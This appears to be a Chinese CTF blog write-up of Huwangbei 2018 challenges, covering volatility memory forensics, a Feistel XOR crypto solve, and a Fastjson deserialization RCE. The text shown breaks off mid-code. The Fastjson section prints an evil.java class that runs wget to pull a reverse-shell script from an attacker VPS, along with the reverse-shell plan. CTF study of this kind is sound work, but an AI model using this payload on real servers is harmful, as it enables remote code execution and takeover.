<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="护网杯后记-学习笔记"><meta name="keywords" content="php,反序列化,SQL注入,Java,取证分析,密码学"><meta name="author" content="V0WKeep3r,v0wldl@163.com"><meta name="copyright" content="V0WKeep3r"><title>护网杯后记-学习笔记 | V0W's Blog</title><link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.8.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.8.2"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="V0W's Blog" type="application/atom+xml">
</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-Easy-dump"><span class="toc-text">0x01 Easy_dump</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-fez"><span class="toc-text">0x02 fez</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-easy-web"><span class="toc-text">0x03 easy_web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E7%8E%AF%E5%A2%83%E5%A4%8D%E7%8E%B0"><span class="toc-text">3.1 环境复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-%E5%A4%A7%E4%BD%AC%E7%9A%84%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-text">3.2 大佬的攻击思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-%E5%88%A9%E7%94%A8%E5%A4%A7%E4%BD%AC%E7%9A%84payload%E6%B5%8B%E8%AF%95%E6%94%BB%E5%87%BB"><span class="toc-text">3.3 利用大佬的payload测试攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-Easy-laravel"><span class="toc-text">0x04 Easy_laravel</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E7%8E%AF%E5%A2%83%E5%A4%8D%E7%8E%B0"><span class="toc-text">4.1 环境复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-%E6%BA%90%E7%A0%81%E5%8F%91%E7%8E%B0"><span class="toc-text">4.2 源码发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-sql%E6%B3%A8%E5%85%A5"><span class="toc-text">4.3 sql注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE"><span class="toc-text">4.4 密码重置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-5-%E7%99%BB%E9%99%86%E5%90%8E%E5%8F%B0"><span class="toc-text">4.5 登陆后台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-6-%E5%88%A9%E7%94%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6"><span class="toc-text">4.6 利用反序列化删除文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-7-phar%E7%A5%9E%E6%9D%A5%E4%B9%8B%E7%AC%94"><span class="toc-text">4.7 phar神来之笔</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-8-%E6%9C%AC%E9%A2%98%E6%80%BB%E7%BB%93"><span class="toc-text">4.8 本题总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E5%90%8E%E8%AE%B0"><span class="toc-text">0x05 后记</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">0x06 参考链接</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/Kaneki.jpg"></div><div class="author-info__name text-center">V0WKeep3r</div><div class="author-info__description text-center">Stay Hungry, Stay Foolish.</div><div class="follow-button"><a target="_blank" rel="noopener" href="https://github.com/qingchenldl">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">58</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">31</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">12</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://zhuxianjin.github.io/">J0k3r</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://p0desta.com/">p0desta</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://daolgts.github.io/">dlgts</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://iwenhu.cn/">mengchen</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://p0sec.net/">p0</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://asa9ao.xyz/">唯湖</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://seaii-blog.com/">seaii</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://wzt.ac.cn/">WCatalpa.T</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://syf.ac.cn/">7N1ght</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://www.nicefish.top/posts/">nicefish</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://flag0.com/">GetFlag</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/index.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">V0W's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">主页</a><a class="site-page" href="/archives">文章</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/categories">分类</a><a class="site-page" href="/about">关于我</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> 搜索</span></a></span></div><div id="post-info"><div id="post-title">护网杯后记-学习笔记</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-10-18</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF/">CTF</a><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">5.2k</span><span class="post-meta__separator">|</span><span>阅读时长: 21 分钟</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>之前参加护网杯，因为太菜，没做几个题。可能是WP发的早，WP竟然广为流传，是我第一篇阅读量突破3000+的博客，还是感谢队友们（<a target="_blank" rel="noopener" href="https://daolgts.github.io/">道萝岗特森</a>、<a target="_blank" rel="noopener" href="http://wzt.ac.cn/">WCatalpa.T</a>）的强力输出，实在诚惶诚恐。想着，以后也要更加努力的去学习啊，毕竟这么菜，被叫大佬有点不好意思==。先从护网杯的几道没做出的题开始，来学习吧。</p>
<h1 id="0x01-Easy-dump"><a href="#0x01-Easy-dump" class="headerlink" title="0x01 Easy_dump"></a>0x01 Easy_dump</h1><p>比赛时，这个题用了很多的还原工具，花了很多时间，但是都没做出来。。。</p>
<p>后来发现还原工具都是假的==、<code>disk genius</code>提出来的图片是空数据。</p>
<p>这是一个取证分析题，很久以前做过类似的取证分析，但是很久没做过了，有些忘记了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f easy_dump.img imageinfo</span><br><span class="line"><span class="comment"># 直接用volatility的imageinfo查看镜像，发现是windows内存镜像，并且可以看到版本信息</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181016/6H4B2lC3bC.png?imageslim" alt="mark"></p>
<p>volatility提供很多查看当时系统状态信息的指令，我们先用pslist查看当时的进程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mem.vmem --profile&#x3D;WinXPSP2x86 pslist</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# volatility -f easy_dump.img --profile&#x3D;Win7SP1x64 pslist</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          </span><br><span class="line">------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------</span><br><span class="line">0xfffffa8007d0ab30 System                    4      0     88      483 ------      0 2018-10-02 11:55:08 UTC+0000                                 </span><br><span class="line">0xfffffa8008c5b4f0 smss.exe                260      4      2       29 ------      0 2018-10-02 11:55:08 UTC+0000                                 </span><br><span class="line">...</span><br><span class="line">...                    </span><br><span class="line">0xfffffa800a3c7b30 explorer.exe           1456   1404     34     1007      1      0 2018-10-02 11:55:11 UTC+0000                                 </span><br><span class="line">0xfffffa800a44eb30 vmtoolsd.exe           1568   1456      9      215      1      0 2018-10-02 11:55:12 UTC+0000                                 </span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0xfffffa8009ce58b0 DumpIt.exe             1476   1456      1       23      1      1 2018-10-02 11:59:30 UTC+0000                                 </span><br><span class="line">0xfffffa80095f1b30 conhost.exe             344    408      2       57      1      0 2018-10-02 11:59:30 UTC+0000                               </span><br></pre></td></tr></table></figure>

<p>受篇幅制约，这里只列举部分进程，可以看到有常见的<code>NotePad.exe</code>，<code>explorer.exe</code>,还有一个可疑的进程<code>DumpIt</code></p>
<p>尝试查看NotePad中是否有什么隐藏信息，volatility中notepad插件，可以很方便的查看notepad进程的记录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility notepad -f easy_dump.img pslist --profile&#x3D;Win7SP0x64</span><br></pre></td></tr></table></figure>

<p>但是没发现什么有用的提示之类的东西。</p>
<p>再尝试从其他程序入手。volatility中iehistoty插件，可以很方便的查看ie浏览器的浏览记录。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">**************************************************</span><br><span class="line">Process: 1260 explorer.exe</span><br><span class="line">Cache type &quot;URL &quot; at 0x4235000</span><br><span class="line">Record length: 0x100</span><br><span class="line">Location: :2018093020181001: n3k0@file:&#x2F;&#x2F;&#x2F;C:&#x2F;phos.jpg</span><br><span class="line">Last modified: 2018-09-30 13:19:21 UTC+0000</span><br><span class="line">Last accessed: 2018-09-30 05:19:21 UTC+0000</span><br><span class="line">File Offset: 0x100, Data Offset: 0x0, Data Length: 0x0</span><br><span class="line">**************************************************</span><br><span class="line">Process: 1260 explorer.exe</span><br><span class="line">Cache type &quot;URL &quot; at 0x4235100</span><br><span class="line">Record length: 0x100</span><br><span class="line">Location: :2018093020181001: n3k0@:Host: ?????????</span><br><span class="line">Last modified: 2018-09-30 12:43:38 UTC+0000</span><br><span class="line">Last accessed: 2018-09-30 04:43:38 UTC+0000</span><br><span class="line">File Offset: 0x100, Data Offset: 0x0, Data Length: 0x0</span><br><span class="line">**************************************************</span><br><span class="line">Process: 1260 explorer.exe</span><br><span class="line">Cache type &quot;URL &quot; at 0x4235200</span><br><span class="line">Record length: 0x100</span><br><span class="line">Location: :2018093020181001: n3k0@file:&#x2F;&#x2F;&#x2F;C:&#x2F;phos.jpg</span><br><span class="line">Last modified: 2018-09-30 13:30:14 UTC+0000</span><br><span class="line">Last accessed: 2018-09-30 05:30:14 UTC+0000</span><br><span class="line">File Offset: 0x100, Data Offset: 0x0, Data Length: 0x0</span><br><span class="line">**************************************************</span><br></pre></td></tr></table></figure>

<p>提示指向了一个文件<code>phos.jpg</code>，可能是有东西的，于是利用<code>filescan</code>命令找到文件位置。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# volatility -f .&#x2F;easy_dump.img --profile&#x3D;Win7SP1x64 filescan | grep phos.jpg</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">0x0000000023e067e0     32      0 RW---- \Device\HarddiskVolume1\phos.jpg</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>记下偏移<code>0x0000000023e067e0</code>，使用dumpfiles把这张图片dump出来。</p>
<p>命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f .&#x2F;easy_dump.img --profile&#x3D;Win7SP1x64 dumpfiles -Q 0x0000000023e067e0 --name -D .&#x2F;res</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# volatility -f .&#x2F;easy_dump.img --profile&#x3D;Win7SP1x64 dumpfiles -Q 0x0000000023e067e0 --name -D .&#x2F;res</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">DataSectionObject 0x23e067e0   None   \Device\HarddiskVolume1\phos.jpg</span><br><span class="line">SharedCacheMap 0x23e067e0   None   \Device\HarddiskVolume1\phos.jpg</span><br></pre></td></tr></table></figure>



<p>打开文件，没有直接发现flag，猜测下面是图片隐写了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk -e file.None.0xfffffa800a488e10.phos.jpg.vacb </span><br></pre></td></tr></table></figure>

<p>得到一个压缩包(伪加密，解压就是.img)和一个<code>.img</code>镜像</p>
<p>strings查看.img文件，发现字符串<code>yispyweih!uokt_jwyx_snh_gzfne</code>和一堆二位数字对，怀疑是类似坐标之类的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings message.img </span><br><span class="line">&#x2F;root&#x2F;ctf&#x2F;message</span><br><span class="line">5NRt</span><br><span class="line">lost+found</span><br><span class="line">.message.swp</span><br><span class="line">hint.txt</span><br><span class="line">.Trash-0</span><br><span class="line">b0VIM 8.0</span><br><span class="line">n3k0</span><br><span class="line">shiki-2.local</span><br><span class="line">~n3k0&#x2F;work&#x2F;HuWangBei&#x2F;6&#x2F;message</span><br><span class="line">U3210</span><br><span class="line">#&quot;! </span><br><span class="line">yispyweih!uokt_jwyx_snh_gzfne</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">41 119</span><br><span class="line">41 120</span><br><span class="line">41 121</span><br><span class="line">41 132</span><br><span class="line">41 133</span><br><span class="line">41 134</span><br><span class="line">41 135</span><br><span class="line">41 136</span><br><span class="line">41 137</span><br><span class="line">41 138</span><br><span class="line">41 139</span><br><span class="line">41 140</span><br><span class="line">41 141</span><br><span class="line">41 142</span><br><span class="line">41 1</span><br></pre></td></tr></table></figure>

<p>通过数量（256*256）推测这个数据代表二维码上的黑点和白点 脚本如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image,ImageDraw</span><br><span class="line"></span><br><span class="line">width = <span class="number">300</span></span><br><span class="line">height = <span class="number">300</span></span><br><span class="line">image = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(width,height))</span><br><span class="line">draw = ImageDraw.Draw(image)</span><br><span class="line"></span><br><span class="line">f=open(<span class="string">&#x27;hint.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">    x = int(i.split()[<span class="number">0</span>])</span><br><span class="line">    y = int(i.split()[<span class="number">1</span>])</span><br><span class="line">    draw.point((x, y), fill=(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"></span><br><span class="line">image.save(<span class="string">&#x27;res.jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>得到二维码</p>
<p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181016/69d41h2fFl.jpg?imageslim" alt="mark"></p>
<p>扫码得到hint：</p>
<p><code>Here is the vigenere key: aeolus, but i deleted the encrypted message。</code></p>
<p>之前的密文是维吉尼亚密码，key是<code>aeolus</code></p>
<p><a target="_blank" rel="noopener" href="http://ctf.ssleye.com/vigenere.html">在线解密</a>得到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag：yeeeeeeet!just_find_and_solve</span><br></pre></td></tr></table></figure>

<h1 id="0x02-fez"><a href="#0x02-fez" class="headerlink" title="0x02 fez"></a>0x02 fez</h1><p>这个题一开始思路错了，后来是<strong>道萝岗特森大佬</strong>发现出题人的思路，顺利输出。</p>
<blockquote>
<p>我的思路：</p>
<p>因为test是已知的，第一次fez的调用中用到了test和K，并且密文也是已知的，那么能不能解出来K，然后去解flag？于是回到round函数，可以看到最后一次加密结束时，用到的是K7,那么最后一次的E_L和E_R我们是知道的，我们能不能推出前一次的L和R，也就是没有经过轮加密的L和R，我们已经知道下一轮的密文L等于上一轮的R，下一轮的R等于上一轮的R异或L再异或当前轮所使用的K，那么很容易得出我们能获得上一轮所使用的明文的右半部分，有了上一轮的右半部分，加密后的新的右半部分，如果我们求出上一轮的左边的部分，就能求出当前轮所使用的K，但是根绝目前已知的所有条件，上一轮的明文的左半部分是无法求出的，卡在这里了很长时间，结果无奈放弃了</p>
<p>dlgts大哥的思路：</p>
<p>正向来模拟加密的过程，来发现是否存在漏洞，在round函数中，新一轮的左半部分等于上一轮的右半部分，下一轮的右半部分等于上一轮的左右两部分异或之后再和当前轮的K异或，产生的新一轮的左右两部分拼接成为新的密文。</p>
</blockquote>
<p>知识点：</p>
<ul>
<li><p>相同的数异或为0</p>
</li>
<li><p>0异或任何数还是其本身</p>
</li>
</ul>
<p>于是开始模拟：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一轮：R+R^L^K1</span><br><span class="line">第二轮：R^L^K1 + R^R^L^K1^K2	&#x3D;&gt;	R^L^K1+L^K1^K2（之后原理一致，不保留中间过程）</span><br><span class="line">第三轮：L^K1^K2 + R^K2^K3</span><br><span class="line">第四轮：R^K2^K3 + L^R^K1^K3^K4</span><br><span class="line">第五轮：L^R^K1^K3^K4 + L^K1^K2^K4^K5</span><br><span class="line">第六轮：L^K1^K2^K4^K5 + R^K2^K3^K5^k6</span><br><span class="line">第七轮：R^K2^K3^K5^k6 + R^L^K1^K3^K4^K6^K7		【res】</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结果由K变量和初始的明文的两部分组成  </p>
<p>又因为在包含flag的m变量中进行了相同的fez函数加密，所以和test调用fez函数以后的结果形式是相同的，只是初始的明文不同，又因为根据异或运算的计算逻辑，相同的数异或为0，0异或任何数还是其本身，所以即使我们不知道K变量是什么，因为两次运算结果的K盒子在结果中的形式相同，所以可以抵消掉。</p>
</blockquote>
<p>即由于test变量是用同样的算法得到的，所以test的最终结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rtest^K2^K3^K5^k6 + Rtest^Ltest^K1^K3^K4^K6^K7		【TestRes】</span><br></pre></td></tr></table></figure>

<p>而我们已知<code>test</code>和<code>TestRes</code>，即<code>Ltest</code>和<code>Rtest</code>，</p>
<p>于是在进行推导，容易得到flag的两个部分。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TestRes[0:27] ^ res[0:27] &#x3D;&#x3D; R ^ Rtest</span><br><span class="line">TestRes[27:54] ^ res[27:54] &#x3D;&#x3D; L ^ R ^ Rtest ^ Ltest</span><br><span class="line">(R ^ Rtest) ^ Rtest &#x3D; R</span><br><span class="line">(L ^ R ^ Rtest ^ Ltest) ^ (R^Rtest) ^ Ltest &#x3D; L</span><br></pre></td></tr></table></figure>

<p>MyExp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> len(a)==len(b)</span><br><span class="line">    c=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        c+=chr(ord(a[i])^ord(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">test = <span class="string">&quot;048d26224aae9f6be49f13202c0b173c2346909fcbba868d5d9b7431002957c5c01c546530f84e45b8a3892526401c007bca7d39b0b7&quot;</span>.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">testres = <span class="string">&quot;69d41820c61c7e8fb47fde8f09064f24af72dc6251e97e72bdc2d7c0b4696110ef84f30da6ac88b7059500f8e814cec9e9e13bcafad8&quot;</span>.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">flagres = <span class="string">&quot;32e7094533a1e76ac8acdeb882c0d6965ca954d75dfd00e759b5aff9663f41d49ae70ee18fd3c067ad7ae577433ad2512b764f4b2eb2&quot;</span>.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"></span><br><span class="line">L = flagres[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">R = flagres[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">t_L = testres[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">t_R = testres[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line"></span><br><span class="line">tmp_R = xor(L,t_L)  <span class="comment"># R ^ Rtest</span></span><br><span class="line">tmp_L = xor(R,t_R)  <span class="comment"># L ^ R ^ Rtest ^ Ltest</span></span><br><span class="line"></span><br><span class="line">flag_R = xor(tmp_R, test[<span class="number">27</span>:<span class="number">54</span>]) <span class="comment"># (R ^ Rtest) ^ Rtest</span></span><br><span class="line">flag_L = xor(xor(tmp_L,tmp_R),test[<span class="number">0</span>:<span class="number">27</span>]) <span class="comment"># (L ^ R ^ Rtest ^ Ltest) ^ (R^Rtest) ^ Ltest</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag_L,flag_R</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;festel_weak_666_lol88f j3820&#125;����y�~:;��ȩo�����</span></span><br></pre></td></tr></table></figure>



<p><strong>题目反思</strong></p>
<ol>
<li>对于随机数的解密处理：<ul>
<li>伪随机，并非真正的随机，了解其seed和原理，很大情况下，可以爆破</li>
<li>对于其加密原理进行数学模拟和分析，很可能在某些步骤就可以抵消而和随机结果无关。就像很多高中数学题一样。</li>
<li>妄图通过加密步骤逆向解决，对于有随机的题目来说四徒劳的。</li>
</ul>
</li>
<li>对于加密而言，数学尤其重要，很多数学的思想可以借鉴。</li>
<li>异或是很特殊的运算，A^A = 0，0 ^ any = any.</li>
</ol>
<h1 id="0x03-easy-web"><a href="#0x03-easy-web" class="headerlink" title="0x03 easy_web"></a>0x03 easy_web</h1><h2 id="3-1-环境复现"><a href="#3-1-环境复现" class="headerlink" title="3.1 环境复现"></a>3.1 环境复现</h2><p>之前很少接触JavaWeb，最近倒是在学习这门专业选修也是搞得懵懵的。</p>
<p>因为原题环境关闭了，这里利用了一位大佬写的环境进行测试和学习（感谢0rz）。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/iBearcat/FastJson-JdbcRowSetImpl-RCE">https://github.com/iBearcat/FastJson-JdbcRowSetImpl-RCE</a></p>
<p><a href="https://v0w.top/2018/10/19/EnvConfig_Java-Tomcat/">关于ubantu服务器搭建tomcat环境</a>我写了另一篇博客，需要的朋友欢迎移步阅读。</p>
<p>配置环境不多说</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@V0W:# export tomcat&#x3D;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;tomcat7.0</span><br><span class="line">root@V0W:# echo $tomcat</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;tomcat7.0</span><br><span class="line">root@V0W:&#x2F;# wget &quot;https:&#x2F;&#x2F;github.com&#x2F;iBearcat&#x2F;FastJson-JdbcRowSetImpl&#x2F;raw&#x2F;master&#x2F;FastJson_Vul.war&quot; -P $tomcat&#x2F;webapps&#x2F; &amp;&amp; cd $tomcat&#x2F;bin&#x2F; &amp;&amp; .&#x2F;startup.sh</span><br></pre></td></tr></table></figure>



<p>访问url,看到和比赛时相似的环境</p>
<p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181021/jmgDdE8khk.png?imageslim" alt="mark"></p>
<p>之前只接触了一点JavaWeb，这里也是看了很久各位大佬的文档（在文末参考链接中都给出了），才算是对其利用有了初步了解，加上利用大佬们现成的Poc，解决了这个题目。</p>
<p>首先是原理篇：大佬们的解释一定比我好多了，大家可以参考文末的链接，进行理解。</p>
<blockquote>
<p>Fastjson可以将java的对象转换成json的形式，也可以用来将json转换成java对象，效率较高，被广泛的用在web服务以及android上，它的JSONString（）方法可以将java的对象转换成json格式，同样通过parseObject方法可以将json数据转换成java的对象。</p>
<p>fastjson漏洞出现的地方也就是JSON.parseObject这个方法上面。</p>
<p>在反序列化成对象的过程中，能通过类初始化时候的构造函数或者变量的setter方法执行恶意代码。但是由于这个恶意构造的类不可控，所以这种攻击看上去是无法实施的。</p>
<p>但是可以将编译好的.class或者.jar文件转换成byte[]，然后通过defineClass加载byte[]返回class对象。即将类的定义转换成bcel编码进行攻击。</p>
</blockquote>
<h2 id="3-2-大佬的攻击思路"><a href="#3-2-大佬的攻击思路" class="headerlink" title="3.2 大佬的攻击思路"></a>3.2 大佬的攻击思路</h2><ol>
<li>构造一个payload——evil.class 能够直接执行shell，或者下载一个预先存在VPS某端口的用于反弹shell的py文件</li>
<li>写另一个类，用于将evil.class 生成bcel编码</li>
<li>构造包含恶意攻击类bcel编码的JSON数据，用于攻击</li>
<li>VPS上监听一个端口，实施攻击，反弹shell</li>
</ol>
<h2 id="3-3-利用大佬的payload测试攻击"><a href="#3-3-利用大佬的payload测试攻击" class="headerlink" title="3.3 利用大佬的payload测试攻击"></a>3.3 利用大佬的payload测试攻击</h2><p>evil.java：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evil</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Thread thread = <span class="keyword">new</span> evil();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String cmd = <span class="string">&quot;wget http://vps/neko.py -O /tmp/neko.py&quot;</span>; </span><br><span class="line">    <span class="comment">//这个地址写自己的VPS地址，将反弹shell的py脚本放在一个端口，之后可以通过http访问下载</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;<span class="comment">//尝试直接执行shell</span></span><br><span class="line">            String[] cmds = System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)</span><br><span class="line">                    ? <span class="keyword">new</span> String[]&#123;<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,cmd&#125;</span><br><span class="line">                    : <span class="keyword">new</span> String[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,cmd&#125;;</span><br><span class="line">            Runtime.getRuntime().exec(cmds);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译得到.class文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javac evil.class</span><br></pre></td></tr></table></figure>

<p>另一个<code>BCELencode.java</code>文件中，进行bcel编码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BCELencode</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//There also should be compiled class 